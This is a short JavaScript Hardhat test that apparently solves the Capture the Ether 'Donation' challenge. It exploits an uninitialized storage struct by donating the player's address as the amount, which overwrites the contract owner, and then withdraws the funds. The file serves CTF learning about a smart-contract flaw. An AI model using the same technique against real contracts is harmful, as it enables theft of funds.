import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('Donation', function () {
  it('should exploit how Struct uses storage', async function () {
    const challengeAddress = '0xC7982B53bc0d8466788069f56E2389a1D9cf0827';
    const Challenge = await ethers.getContractFactory('DonationChallenge');
    const challenge = Challenge.attach(challengeAddress);

    const [player] = await ethers.getSigners();
    const amountToDonate = ethers.BigNumber.from(player.address);
    const scale = ethers.BigNumber.from(10).pow(36);
    const fee = amountToDonate.div(scale);

    let tx = await challenge.donate(amountToDonate, { value: fee });
    await tx.wait();

    tx = await challenge.withdraw();
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
